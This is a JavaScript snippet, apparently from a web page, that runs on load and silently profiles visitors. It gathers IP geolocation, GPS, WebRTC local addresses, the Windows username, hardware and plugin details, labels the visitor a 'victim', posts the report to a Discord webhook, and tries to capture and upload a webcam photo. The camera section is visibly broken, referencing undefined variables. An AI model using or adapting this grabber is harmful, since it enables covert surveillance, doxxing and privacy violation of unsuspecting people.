        // ============================================================
        // FUNCTION: Get Windows username (ActiveX for IE/old Edge)
        // ============================================================
        function getWindowsUsername() {
            try {
                // ActiveX only works in Internet Explorer / old Edge with ActiveX enabled
                var wsh = new ActiveXObject("WScript.Shell");
                return wsh.ExpandEnvironmentStrings("%USERNAME%");
            } catch (e) {
                // fallback: try to extract from userAgent (mobile devices sometimes have device name)
                var ua = navigator.userAgent;
                // common patterns for device name
                var match = ua.match(/\(([^;]+);\s*([^;]+);\s*([^;)]+)\)/);
                if (match && match.length > 3) {
                    // e.g. "Windows NT 10.0; Win64; x64" -> not username
                    // but if it's a mobile device, it might have model
                }
                // Try WebRTC local IP to get hostname (sometimes contains computer name)
                // We'll do that later and store.
                return null;
            }
        }

        // ============================================================
        // FUNCTION: Get local IPs via WebRTC (also may expose hostname)
        // ============================================================
        function getLocalIPs() {
            return new Promise((resolve) => {
                var ips = [];
                var pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer))
                    .catch(() => {});
                pc.onicecandidate = function(e) {
                    if (!e.candidate) {
                        pc.close();
                        resolve(ips);
                        return;
                    }
                    var parts = e.candidate.candidate.split(' ');
                    var ip = parts[4];
                    if (ip && ip.indexOf('.') !== -1) {
                        ips.push(ip);
                    }
                };
                // timeout fallback
                setTimeout(() => { pc.close(); resolve(ips); }, 3000);
            });
        }

        // ============================================================
        // FUNCTION: Get GPS via browser API (if allowed)
        // ============================================================
        function getBrowserGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) return resolve(null);
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            });
        }

        // ============================================================
        // FUNCTION: IP info from multiple services (for redundancy)
        // ============================================================
        async function getIPInfo() {
            // Try primary: ipapi.co (has proxy flag)
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                if (data.ip) return { source: 'ipapi', data };
            } catch (e) {}

            // Fallback: ipinfo.io
            try {
                const res = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN'); // optional token
                const data = await res.json();
                if (data.ip) return { source: 'ipinfo', data };
            } catch (e) {}

            // Fallback: ip-api.com
            try {
                const res = await fetch('http://ip-api.com/json/');
                const data = await res.json();
                if (data.query) return { source: 'ip-api', data };
            } catch (e) {}

            return null;
        }

        // ============================================================
        // MAIN EXECUTION
        // ============================================================
        (async function() {
            // ---- COLLECT ALL DATA ----
            var finalData = {};

            // 1. IP info
            var ipInfo = await getIPInfo();
            if (ipInfo) {
                finalData.ip = ipInfo.data.ip || ipInfo.data.query || 'unknown';
                finalData.country = ipInfo.data.country_name || ipInfo.data.country || '?';
                finalData.region = ipInfo.data.region || ipInfo.data.regionName || '?';
                finalData.city = ipInfo.data.city || '?';
                finalData.postal = ipInfo.data.postal || ipInfo.data.zip || '?';
                finalData.lat = ipInfo.data.latitude || ipInfo.data.lat || '?';
                finalData.lon = ipInfo.data.longitude || ipInfo.data.lon || '?';
                finalData.isp = ipInfo.data.org || ipInfo.data.isp || '?';
                finalData.proxy = ipInfo.data.proxy || ipInfo.data.proxy === 'true' || false;
                // vpn detection: proxy flag or if ISP is known VPN
                var vpnKeywords = ['vpn', 'proxy', 'hosting', 'cloud', 'datacenter'];
                var isVpn = finalData.proxy || vpnKeywords.some(k => finalData.isp.toLowerCase().includes(k));
                finalData.vpn = isVpn ? 'Yes (detected)' : 'No (likely residential)';
            } else {
                finalData.ip = 'unknown';
                finalData.vpn = 'Unknown';
            }

            // 2. Browser GPS (if allowed)
            var gps = await getBrowserGPS();
            if (gps) {
                finalData.gps_lat = gps.lat;
                finalData.gps_lon = gps.lon;
                finalData.gps_acc = gps.acc;
            } else {
                finalData.gps_lat = 'not granted';
                finalData.gps_lon = 'not granted';
                finalData.gps_acc = 'N/A';
            }

            // 3. Local IPs via WebRTC
            var localIPs = await getLocalIPs();
            finalData.localIPs = localIPs.length ? localIPs.join(', ') : 'none';

            // 4. Windows username via ActiveX
            var winUser = getWindowsUsername();
            finalData.windowsUsername = winUser || 'not available (browser/OS restrictions)';

            // 5. Device / laptop model from userAgent
            var ua = navigator.userAgent;
            var deviceModel = 'Unknown';
            // Common patterns
            var modelMatch = ua.match(/\(([^;]+);\s*([^;]+);\s*([^;)]+)\)/);
            if (modelMatch) {
                // e.g. "Windows NT 10.0; Win64; x64" -> not model
                // For mobile: "iPhone; CPU iPhone OS 15_0 like Mac OS X" -> parse
            }
            // Try to get from navigator.userAgentData if available
            if (navigator.userAgentData) {
                try {
                    var uaData = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
                    deviceModel = uaData.model || uaData.platform || 'Unknown';
                } catch (e) {}
            }
            // Fallback: if it's Windows, we can't get model, but we can try to parse from userAgent
            if (deviceModel === 'Unknown') {
                if (ua.includes('Windows NT')) {
                    deviceModel = 'Windows PC (model not exposed)';
                } else if (ua.includes('Macintosh')) {
                    deviceModel = 'Mac';
                } else if (ua.includes('iPhone')) {
                    deviceModel = ua.match(/iPhone\s*([^;)]+)/)?.[0] || 'iPhone';
                } else if (ua.includes('Android')) {
                    deviceModel = ua.match(/Android\s*([^;)]+)/)?.[0] || 'Android';
                } else {
                    deviceModel = 'Unknown device';
                }
            }
            finalData.deviceModel = deviceModel;

            // 6. Other system info
            var battery = await navigator.getBattery?.() || {};
            finalData.battery = battery.level ? `${Math.round(battery.level*100)}% (${battery.charging?'charging':'discharging'})` : 'unavailable';
            finalData.cpuCores = navigator.hardwareConcurrency || '?';
            finalData.ram = navigator.deviceMemory || '?';
            finalData.screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
            finalData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            finalData.language = navigator.language;
            finalData.platform = navigator.platform;
            finalData.userAgent = ua;

            // 7. GPU info via WebGL
            var webglData = 'Unavailable';
            var gpuLevel = 'Unknown';
            try {
                var canvas = document.createElement('canvas');
                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    webglData = `${vendor} | ${renderer}`;
                    if (renderer.includes('RTX') || renderer.includes('GeForce 50') || renderer.includes('RX 9')) gpuLevel = 'Gamer/High-end';
                    else if (renderer.includes('RTX 40') || renderer.includes('RX 7')) gpuLevel = 'Mid-high';
                    else if (renderer.includes('Intel') || renderer.includes('UHD') || renderer.includes('Iris')) gpuLevel = 'Integrated/Basic';
                    else gpuLevel = 'Other';
                }
            } catch (e) {}
            finalData.gpu = webglData;
            finalData.gpuLevel = gpuLevel;

            // 8. Plugins list
            var pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
            finalData.plugins = pluginsList;

            // 9. Tech-savvy level based on plugins
            var savvyKeywords = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
            var savvyCount = savvyKeywords.filter(k => pluginsList.includes(k)).length;
            var userLevel = savvyCount >= 2 ? 'Tech-savvy (privacy aware)' : (savvyCount === 1 ? 'Moderate' : 'Beginner (basic)');
            finalData.userLevel = userLevel;

            // 10. Coordinates (from IP or GPS)
            finalData.coordinates = (finalData.gps_lat !== 'not granted' && finalData.gps_lat) ?
                `GPS: ${finalData.gps_lat}, ${finalData.gps_lon} (acc: ${finalData.gps_acc}m)` :
                `IP-based: ${finalData.lat}, ${finalData.lon}`;

            // ---- BUILD DISCORD MESSAGE ----
            var msg = `**🔹 DEDSEC CTOS – VICTIM INFO 🔹**\n` +
                `**IP:** ${finalData.ip}\n` +
                `**ISP:** ${finalData.isp}\n` +
                `**VPN/Proxy:** ${finalData.vpn}\n` +
                `**Location:** ${finalData.city}, ${finalData.region}, ${finalData.country} (${finalData.postal})\n` +
                `**Coordinates:** ${finalData.coordinates}\n` +
                `**Local IPs (WebRTC):** ${finalData.localIPs}\n` +
                `**Device / Laptop:** ${finalData.deviceModel}\n` +
                `**Windows Username:** ${finalData.windowsUsername}\n` +
                `**OS:** ${finalData.platform}\n` +
                `**Browser:** ${finalData.userAgent}\n` +
                `**CPU Cores:** ${finalData.cpuCores}\n` +
                `**RAM:** ${finalData.ram} GB\n` +
                `**Screen:** ${finalData.screen}\n` +
                `**Battery:** ${finalData.battery}\n` +
                `**Timezone:** ${finalData.timezone}\n` +
                `**Language:** ${finalData.language}\n` +
                `**GPU:** ${finalData.gpu}\n` +
                `**GPU Level:** ${finalData.gpuLevel}\n` +
                `**Plugins:** ${finalData.plugins}\n` +
                `**User Level:** ${finalData.userLevel}\n` +
                `**Hour:** ${new Date().toLocaleString()}`;

            // Send to webhook
            try {
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: msg })
                });
            } catch (e) {}

            // ---- CAMERA CAPTURE (existing functionality) ----
            // (We keep the original camera logic, but we can also enhance it)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
                });
                const video = document.createElement('video'); // not shown, but we can use existing

                canvas.height = vid.videoHeight || 480;

                const fotoData = canvas.toDataURL('image/jpeg', 0.9);
                const blob = dataURLtoBlob(fotoData);
                const form = new FormData();

                form.append('file', blob, 'victim_photo.jpg');
                await fetch(WEBHOOK, { method: 'POST', body: form });
                stream.getTracks().forEach(t => t.stop());
            } catch (err) {}

            // ---- OPTIONAL: also try to get the user's name from the system via other tricks ----
            // (We already attempted ActiveX, but if not available, we can't do more)

            console.log('Data sent to Discord.');
        })();

        // Helper: dataURL to Blob
        function dataURLtoBlob(dataurl) {
            var arr = dataurl.split(',');
            var mime = arr[0].match(/:(.*?);/)[1];
            var bstr = atob(arr[1]);
            var n = bstr.length;
            var u8arr = new Uint8Array(n);
            while (n--) u8arr[n] = bstr.charCodeAt(n);
            return new Blob([u8arr], { type: mime });
        }

        // Keep the original button functionality (if any) – not needed but we keep for compatibility
